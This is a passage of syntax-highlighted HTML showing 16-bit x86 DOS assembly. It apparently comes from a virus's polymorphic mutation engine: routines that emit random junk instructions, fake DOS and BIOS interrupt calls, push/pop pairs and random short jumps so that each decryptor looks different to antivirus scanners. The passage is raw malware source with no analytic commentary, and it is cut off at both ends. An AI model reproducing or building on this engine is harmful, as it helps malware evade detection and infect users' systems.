        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">no_int10</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">                  </span><span class="sc1">; Get current video mode</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">store_int_10</span><span class="sc0">
</span><span class="sc5">no_int10</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">no_get_keystroke</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                  </span><span class="sc1">; Get Keystroke</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">store_int_16</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">                      </span><span class="sc1">; Get shift states</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">store_int_16</span><span class="sc0">
</span><span class="sc5">no_get_keystroke</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">                  </span><span class="sc1">; Get KBD functionality</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">store_int_16</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">                      </span><span class="sc1">; get KBD id</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">store_int_16</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">                  </span><span class="sc1">; check for keystroke</span><span class="sc0">
</span><span class="sc5">store_int_16</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">16cdh</span><span class="sc0">                </span><span class="sc1">; int 16h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">sto_n_xit</span><span class="sc0">
</span><span class="sc5">store_int_10</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10cdh</span><span class="sc0">                </span><span class="sc1">; int 10h</span><span class="sc0">
</span><span class="sc5">sto_n_xit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">just_b4_end</span><span class="sc0">


</span><span class="sc5">generate_int</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">doint</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; rnd in ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b4h</span><span class="sc0">                         </span><span class="sc1">; MOV ah,</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">nocx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">count_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">go_on_ah</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">go_on_ah</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">go_on_ah</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">lamah_jump</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                          </span><span class="sc1">; is BX as counter?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">lamah_jump</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">point_reg</span><span class="sc4">],</span><span class="sc2">03h</span><span class="sc0">     </span><span class="sc1">; is BX as pointer?</span><span class="sc0">
</span><span class="sc5">lamah_jump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">intwithacd</span><span class="sc0">                      </span><span class="sc1">; those with AX,CX,DX</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">no_es_modify</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">int10_16</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">no_es_modify</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">intwithacd</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">go_on_ah</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">allocmem</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getpsp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">                          </span><span class="sc1">; dos version</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeandint</span><span class="sc0">
</span><span class="sc5">go_on_ah</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">onlyahint</span><span class="sc0">
</span><span class="sc5">no_es_modify</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">space_stuff</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">another_one</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0">                          </span><span class="sc1">; get psp adress</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeandint</span><span class="sc0">
</span><span class="sc5">space_stuff</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">36h</span><span class="sc0">                          </span><span class="sc1">; get free disk space C:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03b2h</span><span class="sc0">                         </span><span class="sc1">; mov dl,03</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeandint</span><span class="sc0">
</span><span class="sc5">another_one</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6601h</span><span class="sc0">                        </span><span class="sc1">; get codepage</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeandint</span><span class="sc0">
</span><span class="sc5">getpsp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">                          </span><span class="sc1">; get psp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeandint</span><span class="sc0">
</span><span class="sc5">intwithacd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">getbdrive</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">                          </span><span class="sc1">; ah=06h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b2h</span><span class="sc0">                         </span><span class="sc1">; mov dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">                         </span><span class="sc1">; ffh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeandint</span><span class="sc0">
</span><span class="sc5">allocmem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">                          </span><span class="sc1">; allocate mem</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0bbh</span><span class="sc0">                         </span><span class="sc1">; in bx max mem avaiable</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">; bx=ffffh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeandint</span><span class="sc0">
</span><span class="sc5">getbdrive</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3305h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">storeandint</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">058h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeandint</span><span class="sc0">
</span><span class="sc5">onlyahint</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">okah</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getcdrive</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getveryfl</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">get_mem_int_12</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">get_equipment_list</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc0">                          </span><span class="sc1">; get stdin status</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeandint</span><span class="sc0">
</span><span class="sc5">get_mem_int_12</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">12cdh</span><span class="sc0">                        </span><span class="sc1">; get avaiable memory</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">just_b4_end</span><span class="sc0">
</span><span class="sc5">get_equipment_list</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">11cdh</span><span class="sc0">                        </span><span class="sc1">; get bios equipment list</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">just_b4_end</span><span class="sc0">
</span><span class="sc5">getveryfl</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">054h</span><span class="sc0">                         </span><span class="sc1">; get verify flag</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeandint</span><span class="sc0">
</span><span class="sc5">getcdrive</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">019h</span><span class="sc0">                         </span><span class="sc1">; get default drive</span><span class="sc0">
</span><span class="sc5">storeandint</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">021cdh</span><span class="sc0">                       </span><span class="sc1">; int 21h</span><span class="sc0">
</span><span class="sc5">just_b4_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">look_4_int_jmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cmp_check</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">icantint</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">icantint</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cmp_check</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_compare</span><span class="sc0">
</span><span class="sc5">icantint</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">dopushpop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">push_nr</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; increment the numba of pushes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">no_segment_push</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">                  </span><span class="sc1">; push es</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">add_n_store</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                  </span><span class="sc1">; push cs</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">add_n_store</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                  </span><span class="sc1">; push ds</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">add_n_store</span><span class="sc0">
</span><span class="sc5">no_segment_push</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">                  </span><span class="sc1">; push a reg</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc5">add_n_store</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">no_pop_segment</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">                  </span><span class="sc1">; pop es</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">try_pop_ds</span><span class="sc0">
</span><span class="sc5">try_pop_ds</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">                  </span><span class="sc1">; pop ds</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ds_mody</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">store_pop</span><span class="sc0">
</span><span class="sc5">no_pop_segment</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">                  </span><span class="sc1">; pop with the selected one</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc5">store_pop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">push_nr</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; number of pushes curr. active</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">jumping_zone</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cmp_check2</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; lock jumping</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">conditional_jump</span><span class="sc0">
</span><span class="sc5">jump_short_crea</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ebh</span><span class="sc0">                         </span><span class="sc1">; jmp short</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">store_jump</span><span class="sc0">
</span><span class="sc5">conditional_jump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc0">                          </span><span class="sc1">; jmp base</span><span class="sc0">
</span><span class="sc5">store_jump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; write jmp</span><span class="sc0">
</span><span class="sc5">retry_cond_jump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; where will jump</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7fh</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">ok_lenght_jump</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">retry_cond_jump</span><span class="sc0">
</span><span class="sc5">ok_lenght_jump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; put the bytes to jump</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
